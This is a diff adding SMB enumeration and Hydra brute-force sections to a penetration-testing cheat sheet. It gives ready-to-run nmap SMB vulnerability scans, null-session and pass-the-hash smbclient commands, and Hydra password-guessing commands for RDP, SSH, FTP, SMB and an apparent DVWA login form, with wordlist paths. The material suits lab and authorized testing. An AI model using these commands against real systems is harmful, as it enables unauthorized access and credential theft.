@@ -40,9 +40,44 @@ SecLists (`/usr/share/seclists/Discovery/Web-Content/`):
 
 ### 2.3. SMB `139`/`445`
 
-enum4linux
+|   |   |
+|---|---|
+|Checking for vulnerabilties|`nmap -Pn -p445 --script smb-vuln-* $TARGET`|
+|Checking for SambaCry|`nmap -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $TARGET`|
+|Enumerate using empty username/password|`enum4linux $TARGET`|
+|Enumerate with specified username/password|`enum4linux -u $USERNAME -p $PASSWORD $TARGET`|
+|List shares using NULL|`smbclient -N -L //$TARGET`|
+|List shares using username/password|`smbclient -U '$USERNAME%$PASSWORD' -L //$TARGET`|
+|List shares using username/hash|`smbclient -U $USERNAME --pw-nt-hash -L //$TARGET`|
+|Connect to share using NULL|`smbclient -N //$TARGET/$SHARE`|
+|Connect to share using username/password|`smbclient -U '$USERNAME%$PASSWORD' //$TARGET`|
+|Connect to share using username/hash|`smbclient -U $USERNAME --pw-nt-hash //$TARGET`|
 
 ### 2.4. LDAP `389`
+
+### 2.5. Brute force (Hydra)
+
+#### RDP/SSH/FTP/SMB
+
+|   |   |
+|---|---|
+|Specify username|`hydra -l $USERNAME -P passwords.txt $TARGET <rdp|ssh|ftp|smb>`|
+|Use username list|`hydra -L usernames.txt -P passwords.txt $TARGET <rdp|ssh|ftp|smb>`|
+
+#### Web
+
+```console
+hydra -l admin -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
+hydra -l admin -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
+hydra -L users.txt -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:F=Username and/or password incorrect.'
+hydra -L users.txt -P rockyou.txt foxtrot.vx http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low:S=Welcome'
+```
+
+#### Wordlists:
+
+1. `/usr/share/wordlists/rockyou`
+2. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt`
+3. `/usr/share/seclists/Usernames/Names/names.txt`
 
 ## 3. Shells
 
